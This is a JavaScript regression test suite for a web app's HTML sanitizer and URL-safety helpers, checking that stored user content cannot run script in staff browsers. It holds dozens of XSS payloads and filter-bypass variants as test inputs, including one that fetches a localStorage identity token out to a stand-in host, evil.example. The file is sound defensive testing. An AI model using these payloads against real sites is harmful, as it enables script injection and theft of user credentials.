// HTML sanitizer regression tests — run: node scripts/sanitize-test.js
// Guards src/sanitizeHtml.js, the single render-boundary sanitizer that stands
// between anonymously-writable Firestore fields and crew/admin browsers.
// Exit 0 = all pass. Wired into `prebuild`, so the pre-push hook enforces it.
//
// Same shape as scripts/gcportal-test.js / gcnotify-test.js: plain node, no
// framework, requires the SHIPPED module directly so there is no copy to drift.
"use strict";

const { JSDOM } = require("jsdom");
const S = require("../src/sanitizeHtml.js");

// The module auto-detects a browser window; under node we hand it jsdom.
S.configureSanitizer(new JSDOM("").window);

const { sanitizeHtml, escapeHtml } = S;

let failures = 0;
function t(name, cond, detail) {
  if (cond) { console.log("  ok  " + name); }
  else { failures++; console.error("  FAIL " + name + (detail ? " — " + detail : "")); }
}

// Every assertion below is "would this string, if an outsider stored it in
// jobs/* or homeowner_requests/*, be able to run code in a crew browser?"
const lower = (s) => String(s).toLowerCase();
/** No executable surface survived: no script/svg/img/iframe tag, no on* handler,
 *  no javascript: URI. This is the property that actually matters. */
function inert(out) {
  const o = lower(out);
  // No raw "<" means no element can ever be constructed, so nothing can fire.
  // Fully entity-escaped text lands here — "&lt;img ... onerror=alert(1)&gt;"
  // is a literal string on screen, even though it still contains the substring
  // "onerror=". Checking this FIRST is what keeps the handler regex below from
  // reporting a false positive on escaped output.
  if (o.indexOf("<") === -1) return true;
  if (/<\s*(script|svg|iframe|img|object|embed|form|style|link|meta|math|base)\b/.test(o)) return false;
  if (/\son[a-z]+\s*=/.test(o)) return false;          // onerror=, onload=, onclick=…
  if (/javascript\s*:/.test(o)) return false;
  if (/srcdoc|formaction|xlink:href/.test(o)) return false;
  return true;
}

console.log("\n── the four payloads named in the Stage 2a plan ──");

const IMG = '<img src=x onerror=alert(1)>';
t("img/onerror is neutralized", inert(sanitizeHtml(IMG)), sanitizeHtml(IMG));

const SVG = '<svg onload=alert(1)>';
t("svg/onload is neutralized", inert(sanitizeHtml(SVG)), sanitizeHtml(SVG));

const JSHREF = '<a href="javascript:alert(1)">click</a>';
const jsOut = sanitizeHtml(JSHREF);
t("javascript: href is neutralized", inert(jsOut), jsOut);
t("…and its link TEXT still shows (no silent content loss)",
  jsOut.indexOf("click") !== -1, jsOut);

const MALFORMED = '<div><b>unclosed <i>nested <img src=x onerror=alert(1)> tail';
t("malformed/nested markup is neutralized", inert(sanitizeHtml(MALFORMED)), sanitizeHtml(MALFORMED));
t("…and its text survives", sanitizeHtml(MALFORMED).indexOf("unclosed") !== -1);

console.log("\n── permitted formatting must SURVIVE (this is stored data) ──");
// If these fail, the fix has silently blanked formatting on real punch items
// and answers already in Firestore — a data-visibility regression, not a
// security one, and the reason plain-text rendering was rejected.
const bold = sanitizeHtml("<b>Panel A</b> feeds <i>sub 2</i>");
t("bold + italic survive", bold.indexOf("<b>") !== -1 && bold.indexOf("<i>") !== -1, bold);
t("underline survives", sanitizeHtml("<u>UFER</u>").indexOf("<u>") !== -1);
t("line breaks survive", sanitizeHtml("line1<br>line2").indexOf("<br") !== -1);
t("paragraphs/divs survive", sanitizeHtml("<div>a</div><p>b</p>").indexOf("<div>") !== -1);

// execCommand('foreColor') with no styleWithCSS emits <font color> — this is
// what the crew's colour swatches actually produce (App.js:4706).
// REGRESSION GUARD: the first version of this suite only tested "#B23A3A" and
// passed — but ONLY because "#" is an alternative in ALLOWED_URI_REGEXP. Every
// named and rgb() colour was being silently stripped, because `color` is not in
// DOMPurify's DEFAULT_URI_SAFE_ATTRIBUTES and was therefore URI-validated.
// Testing one hex value gave a false green. Test the whole vocabulary.
[
  "#B23A3A", "#eab308", "#fff", "red", "blue", "rebeccapurple", "rgb(1,2,3)", "rgba(1,2,3,0.5)",
].forEach((c) => {
  const out = sanitizeHtml('<font color="' + c + '">RED TAG</font>');
  t("<font color=" + c + "> survives", out.indexOf(c) !== -1, out);
  t("  …text survives for " + c, out.indexOf("RED TAG") !== -1, out);
});
// …and a hostile colour value is still dropped.
const badColor = sanitizeHtml('<font color="javascript:alert(1)">x</font>');
t("hostile color value dropped", lower(badColor).indexOf("color=") === -1, badColor);

// span+style is the other colour shape (pasted content, styleWithCSS browsers).
const spanOut = sanitizeHtml('<span style="color:#46916A">ok</span>');
t("span style=color survives", lower(spanOut).indexOf("color") !== -1, spanOut);
t("named colour survives",
  lower(sanitizeHtml('<span style="color:red">x</span>')).indexOf("color") !== -1);
t("rgb() colour survives",
  lower(sanitizeHtml('<span style="color:rgb(1,2,3)">x</span>')).indexOf("color") !== -1);

console.log("\n── pasted formatting (allowlist widened 2026-07-31, Koy's call) ──");
// Crew paste formatted blocks out of Word/email. Because RichEditor hydrates
// from sanitized HTML, anything dropped here becomes permanent on their next
// keystroke — so these are data-fidelity assertions, not cosmetics.
[
  ["heading h3", "<h3>Panel schedule</h3>", "<h3>"],
  ["heading h1", "<h1>Scope</h1>", "<h1>"],
  ["table structure", "<table><tbody><tr><td>A</td><td>B</td></tr></tbody></table>", "<td>"],
  ["table header cell", "<table><tr><th>Ckt</th></tr></table>", "<th>"],
  ["colspan kept", '<table><tr><td colspan="2">A</td></tr></table>', "colspan"],
  ["background-color", '<span style="background-color:yellow">hi</span>', "background-color"],
  ["font-weight", '<span style="font-weight:700">hi</span>', "font-weight"],
  ["text-align", '<div style="text-align:center">hi</div>', "text-align"],
  ["two valid declarations", '<span style="color:#c00;background-color:yellow">hi</span>', "background-color"],
].forEach(([name, input, expect]) => {
  const out = sanitizeHtml(input);
  t("paste kept: " + name, lower(out).indexOf(expect.toLowerCase()) !== -1, out);
  t("  …inert: " + name, inert(out), out);
});
// Widening must not have opened anything.
[
  ["td with handler", '<table><tr><td onclick="alert(1)">x</td></tr></table>'],
  ["h3 with handler", '<h3 onmouseover="alert(1)">x</h3>'],
  ["style with unknown prop", '<div style="color:red;behavior:url(#x)">x</div>'],
  ["style with position", '<div style="position:fixed;top:0">x</div>'],
  ["colspan injection", '<table><tr><td colspan="x onload=alert(1)">y</td></tr></table>'],
].forEach(([name, payload]) => {
  const out = sanitizeHtml(payload);
  t("widening did not open: " + name, inert(out), JSON.stringify(out));
});
// Per-declaration filtering: the offending declaration goes, valid ones stay.
// (This previously discarded the whole attribute, silently losing the crew's colour.)
t("unknown style property is dropped",
  lower(sanitizeHtml('<div style="color:red;behavior:url(#x)">x</div>')).indexOf("behavior") === -1);
t("…while the valid declaration beside it survives",
  lower(sanitizeHtml('<div style="color:red;behavior:url(#x)">x</div>')).indexOf("color:red") !== -1);
t("too many declarations dropped",
  lower(sanitizeHtml('<div style="color:red;color:red;color:red;color:red;color:red;color:red;color:red;color:red;color:red">x</div>')).indexOf("style=") === -1);

// The style hook: anything that is not an allowlisted declaration is dropped.
// These are the cases DOMPurify alone did NOT catch under jsdom, so they are
// the reason the hook exists — a regression here is a real hole.
[
  ["url(javascript:)", '<div style="background:url(javascript:alert(1))">x</div>'],
  ["expression()", '<div style="width:expression(alert(1))">x</div>'],
  ["behavior:", '<div style="behavior:url(#default#time2)">x</div>'],
  ["-moz-binding", '<div style="-moz-binding:url(https://evil.example/x.xml#x)">x</div>'],
  ["position fixed overlay", '<div style="position:fixed;top:0;left:0;width:99vw;height:99vh">x</div>'],
].forEach(([name, payload]) => {
  const out = sanitizeHtml(payload);
  t("style dropped: " + name, inert(out) && lower(out).indexOf("style=") === -1, JSON.stringify(out));
  t("…text kept: " + name, out.indexOf("x") !== -1, JSON.stringify(out));
});
// Mixed: the dangerous declaration must go, the legitimate one must stay.
{
  const out = sanitizeHtml('<div style="color:red;background:url(javascript:alert(1))">x</div>');
  t("mixed style: dangerous declaration dropped",
    inert(out) && lower(out).indexOf("url(") === -1, out);
  t("mixed style: legitimate colour kept", lower(out).indexOf("color:red") !== -1, out);
}

const listOut = sanitizeHtml("<ul><li>one</li><li>two</li></ul>");
t("bullet list survives", listOut.indexOf("<li>") !== -1, listOut);
t("numbered list survives", sanitizeHtml("<ol><li>x</li></ol>").indexOf("<ol>") !== -1);

const safeLink = sanitizeHtml('<a href="https://homesteadelectric.net">spec</a>');
t("https link survives", safeLink.indexOf("href") !== -1, safeLink);
t("…and gets rel=noopener (opener is not handed a window ref)",
  lower(safeLink).indexOf("noopener") !== -1, safeLink);

console.log("\n── bypass attempts beyond the four named payloads ──");
[
  ["bare script", "<script>alert(1)</script>"],
  ["case-varied script", "<ScRiPt>alert(1)</ScRiPt>"],
  ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["svg nested script", "<svg><script>alert(1)</script></svg>"],
  ["body onload", "<body onload=alert(1)>"],
  ["details ontoggle", "<details open ontoggle=alert(1)>x</details>"],
  ["allowed tag + handler", '<b onmouseover="alert(1)">hover</b>'],
  ["allowed tag + onclick", '<span onclick="alert(1)">tap</span>'],
  ["encoded javascript URI", '<a href="&#106;avascript:alert(1)">x</a>'],
  ["whitespace-split URI", '<a href="java\tscript:alert(1)">x</a>'],
  ["newline-split URI", '<a href="java\nscript:alert(1)">x</a>'],
  ["vbscript URI", '<a href="vbscript:msgbox(1)">x</a>'],
  ["data: html URI", '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'],
  ["style expression", '<div style="width:expression(alert(1))">x</div>'],
  ["style url(javascript:)", '<div style="background:url(javascript:alert(1))">x</div>'],
  ["object/embed", '<object data="x"></object><embed src="x">'],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=x">'],
  ["base href hijack", '<base href="https://evil.example/">'],
  ["form + formaction", '<form><button formaction="javascript:alert(1)">x</button></form>'],
  ["math mtext xss", "<math><mtext><script>alert(1)</script></mtext></math>"],
  ["noscript wrapper", "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"],
  ["comment-hidden payload", "<!--<img src=x onerror=alert(1)>-->"],
  ["null byte in tag", "<img  src=x onerror=alert(1)>"],
  ["backtick attr", "<img src=`x` onerror=alert(1)>"],
  ["unquoted overlong attr", "<img src=x:x onerror=alert(1) //>"],
  ["template tag", "<template><img src=x onerror=alert(1)></template>"],
  ["link stylesheet", '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ["xlink:href svg", '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
].forEach(([name, payload]) => {
  const out = sanitizeHtml(payload);
  t("blocked: " + name, inert(out), JSON.stringify(out));
});

console.log("\n── DOM clobbering ──");
// A surviving name/id can shadow document.getElementById lookups and break
// unrelated code. SANITIZE_DOM plus the attribute allowlist should drop both.
const clob = sanitizeHtml('<form name="attributes"><input name="getElementById"></form>');
t("clobbering names dropped", inert(clob) && lower(clob).indexOf("name=") === -1, clob);
const idOut = sanitizeHtml('<div id="documentElement">x</div>');
t("id attribute dropped (not in allowlist)", lower(idOut).indexOf("id=") === -1, idOut);

console.log("\n── the real end-to-end chain from the verification pass ──");
// Exactly the shape an outsider could store in homeowner_requests/{jobId}
// .questionAnswers → adopted at App.js:24425 → rendered at App.js:27863.
const CHAIN =
  'Panel looks good <img src=x onerror="fetch(\'https://evil.example/?d=\'+localStorage.he_identity)">';
const chainOut = sanitizeHtml(CHAIN);
t("share-link answer payload cannot exfiltrate he_identity", inert(chainOut), chainOut);
t("…and the homeowner's real words still render",
  chainOut.indexOf("Panel looks good") !== -1, chainOut);

// The same value stored as punch item.text → rendered at 43218 (internal) and
// 43374 (PUBLIC PunchSharePage). Same helper, so one assertion covers both.
const PUNCH = '<b>Rough</b> ok<svg onload=alert(document.domain)>';
const punchOut = sanitizeHtml(PUNCH);
t("punch text payload neutralized on internal AND public share", inert(punchOut), punchOut);
t("…and its bold formatting survives", punchOut.indexOf("<b>") !== -1, punchOut);

console.log("\n── contract / fail-safe behaviour ──");
t("null → empty string", sanitizeHtml(null) === "");
t("undefined → empty string", sanitizeHtml(undefined) === "");
t("empty → empty", sanitizeHtml("") === "");
t("plain text passes through untouched", sanitizeHtml("just text") === "just text");
t("number input does not throw", sanitizeHtml(42) === "42");
t("entity-only text is preserved as entities",
  lower(sanitizeHtml("a &amp; b")).indexOf("&amp;") !== -1, sanitizeHtml("a &amp; b"));
t("idempotent (sanitizing twice changes nothing)",
  sanitizeHtml(sanitizeHtml(IMG)) === sanitizeHtml(IMG));
// Cache must key on input, not leak between distinct values.
t("cache does not cross-contaminate",
  sanitizeHtml("<b>one</b>") !== sanitizeHtml("<b>two</b>"));
t("repeat call returns identical output", sanitizeHtml(IMG) === sanitizeHtml(IMG));
t("sanitizeProps returns the render-prop shape",
  S.sanitizeProps("<b>x</b>").__html === sanitizeHtml("<b>x</b>"));

console.log("\n── escapeHtml (used on the adoption write path) ──");
t("escapes angle brackets", escapeHtml("<b>x</b>") === "&lt;b&gt;x&lt;/b&gt;");
t("escapes ampersand first (no double-encode inversion)",
  escapeHtml("&lt;") === "&amp;lt;");
t("escapes quotes", escapeHtml('"\'') === "&quot;&#39;");
t("null → empty", escapeHtml(null) === "");
t("escaped payload is inert", inert(escapeHtml(IMG)), escapeHtml(IMG));
t("escaped output survives sanitize as visible text",
  sanitizeHtml(escapeHtml(IMG)).indexOf("&lt;img") !== -1, sanitizeHtml(escapeHtml(IMG)));

console.log("\n── performance: no catastrophic backtracking ──");
// WHY THIS SECTION EXISTS: every other assertion in this file is about
// correctness, and that is exactly how a quadratic regex shipped past 83 green
// checks. jobs/* is anonymously writable and sanitizeHtml runs SYNCHRONOUSLY
// inside React render, so a slow input is not "slow" — it is a frozen phone,
// stored, recurring for every viewer on every load. Assert wall-clock.
{
  // Values that MATCH the colour alternation and then fail the end anchor are
  // the worst case for the style tail; same shape for the colour attribute.
  [
    ["style tail", (n) => '<span style="color:red' + " ".repeat(n) + '!">punch</span>'],
    ["color attr", (n) => '<font color="red' + " ".repeat(n) + '!">punch</font>'],
    ["style lead", (n) => '<span style="' + " ".repeat(n) + 'color:red">punch</span>'],
  ].forEach(([name, mk]) => {
    const t0 = Date.now();
    sanitizeHtml(mk(64000));
    const ms = Date.now() - t0;
    // Linear handling of 64k is single-digit ms; the quadratic form took
    // seconds. 400ms sits far above the good case and far below the bad one.
    t(`64k-char ${name} payload stays fast (${ms}ms)`, ms < 400, ms + "ms");
  });

  // Growth must be roughly linear: 4x the input should cost far less than the
  // ~16x a quadratic scan would.
  const mk = (n) => '<span style="color:red' + " ".repeat(n) + '!">x</span>';
  sanitizeHtml(mk(1000)); // warm
  const a0 = Date.now(); for (let i = 0; i < 20; i++) sanitizeHtml(mk(8000 + i));
  const small = Math.max(1, Date.now() - a0);
  const b0 = Date.now(); for (let i = 0; i < 20; i++) sanitizeHtml(mk(32000 + i));
  const big = Date.now() - b0;
  const ratio = big / small;
  t(`4x input costs well under quadratic (${ratio.toFixed(1)}x; quadratic ~16x)`,
    ratio < 8, `small=${small}ms big=${big}ms`);
}

console.log("\n── hardening found by adversarial review ──");
// Each of these was a real gap in the first cut of this module.
t("protocol-relative //host href is rejected",
  lower(sanitizeHtml('<a href="//evil.example/x">x</a>')).indexOf("href") === -1,
  sanitizeHtml('<a href="//evil.example/x">x</a>'));
t("…but a same-site /path href still works",
  sanitizeHtml('<a href="/job/123">x</a>').indexOf('href="/job/123"') !== -1);
t("data-* attributes are dropped (DOMPurify defaults them ON)",
  lower(sanitizeHtml('<span data-x="1">x</span>')).indexOf("data-x") === -1);
t("aria-* attributes are dropped",
  lower(sanitizeHtml('<span aria-label="y">x</span>')).indexOf("aria-") === -1);
// An anonymously-written non-string must not throw inside a React render.
[42, 0, true, {}, [], ["a"]].forEach((v) => {
  let ok = true, out;
  try { out = sanitizeHtml(v); } catch (e) { ok = false; out = "THREW " + e.message; }
  t("non-string input does not throw: " + JSON.stringify(v), ok && typeof out === "string", out);
});
// Genuine fail-closed: a sanitizer that cannot sanitize must escape, not pass through.
{
  const broken = S.configureSanitizer({});   // unsupported -> no usable instance
  t("unusable environment yields no instance", broken === null, String(broken));
  const out = sanitizeHtml(IMG);
  t("…and output is escaped, NOT raw", inert(out) && out !== IMG, out);
  t("…and it is not a passthrough", out.indexOf("<img") === -1, out);
  S.configureSanitizer(new JSDOM("").window);   // restore
  t("…and the sanitizer recovers after reconfigure",
    sanitizeHtml("<b>x</b>").indexOf("<b>") !== -1, sanitizeHtml("<b>x</b>"));
}

console.log("\n── URL boundary (Stage 2d) ──");
// React does NOT block javascript: hrefs (verified against 18.3.1), and photo
// records live in anonymously-writable collections. safeUrl is what stops a
// stored record named "punchlist.pdf" from running code when an admin clicks it.
const { safeUrl, safeImageSrc } = S;
[
  ["https storage URL", "https://firebasestorage.googleapis.com/v0/b/x/o/y.pdf", true],
  ["http URL", "http://example.test/a", true],
  ["mailto", "mailto:koy@homesteadelectric.net", true],
  ["tel", "tel:+15551234567", true],
  ["same-site path", "/job/123", true],
  ["hyphens preserved", "https://my-site.example/a-b-c.pdf", true],
  ["javascript:", "javascript:alert(1)", false],
  ["mixed-case javascript:", "JaVaScRiPt:alert(1)", false],
  ["tab-split javascript:", "java\tscript:alert(1)", false],
  ["newline-split javascript:", "java\nscript:alert(1)", false],
  ["leading-space javascript:", "   javascript:alert(1)", false],
  ["vbscript:", "vbscript:msgbox(1)", false],
  ["data:text/html", "data:text/html;base64,PHNjcmlwdD4=", false],
  ["blob: (not for links)", "blob:https://x/y", false],
  ["protocol-relative", "//evil.example/x", false],
  ["empty", "", false],
  ["null", null, false],
].forEach(([name, input, shouldPass]) => {
  const out = safeUrl(input);
  t("safeUrl " + (shouldPass ? "allows" : "blocks") + ": " + name,
    shouldPass ? out !== "" : out === "", JSON.stringify(out));
});
t("safeUrl preserves the exact URL it allows",
  safeUrl("https://my-site.example/a-b-c.pdf") === "https://my-site.example/a-b-c.pdf");

// Images additionally need blob: and data:image for the upload-preview path.
[
  ["https", "https://x.test/y.png", true],
  ["blob (upload preview)", "blob:https://x.test/abc", true],
  ["data:image/png", "data:image/png;base64,AAA", true],
  ["data:image/jpeg", "data:image/jpeg;base64,AAA", true],
  ["data:text/html", "data:text/html,<script>alert(1)</script>", false],
  ["javascript:", "javascript:alert(1)", false],
].forEach(([name, input, shouldPass]) => {
  const out = safeImageSrc(input);
  t("safeImageSrc " + (shouldPass ? "allows" : "blocks") + ": " + name,
    shouldPass ? out !== "" : out === "", JSON.stringify(out));
});

console.log("\n── pre-ship review fixes (2026-07-31) ──");
// Browsers treat a backslash like a forward slash in URLs, so "/\host" resolves
// OFF-SITE while passing a naive /(?!\/) guard. Matters on the public share pages.
t("backslash protocol-relative rejected by safeUrl", safeUrl("/\\evil.example/x") === "");
t("backslash protocol-relative rejected by safeImageSrc", safeImageSrc("/\\evil.example/x.png") === "");
t("backslash protocol-relative stripped from href",
  lower(sanitizeHtml('<a href="/\\evil.example/x">x</a>')).indexOf("href") === -1,
  sanitizeHtml('<a href="/\\evil.example/x">x</a>'));
t("…but a normal same-site path still works", safeUrl("/job/123") === "/job/123");
// One unrecognised declaration used to discard the WHOLE style attribute,
// silently losing a colour the crew had applied.
{
  const out = sanitizeHtml('<span style="color:#c00;font-family:Arial">X</span>');
  t("valid colour survives an unknown neighbouring declaration",
    lower(out).indexOf("color:#c00") !== -1, out);
  t("…and the unknown declaration is gone", lower(out).indexOf("font-family") === -1, out);
}
{
  const out = sanitizeHtml('<span style="color:#c00;background:url(javascript:alert(1))">X</span>');
  t("valid colour survives a DANGEROUS neighbouring declaration", lower(out).indexOf("color:#c00") !== -1, out);
  t("…and the dangerous one is dropped", inert(out) && lower(out).indexOf("url(") === -1, out);
}

console.log("\n── fail-closed contract ──");
// If DOMPurify ever fails to initialise, sanitizeHtml() falls back to
// escapeHtml() rather than returning its input. Assert the property that
// matters: the fallback is inert and is NOT a passthrough.
{
  const out = escapeHtml(IMG);
  t("fallback is entity-escape, not passthrough", inert(out) && out !== IMG, out);
  t("fallback keeps the payload visible as text", out.indexOf("img") !== -1, out);
}

console.log("");
if (failures) {
  console.error(`sanitize-test: ${failures} FAILURE(S)\n`);
  process.exit(1);
}
console.log("sanitize-test: all checks passed\n");
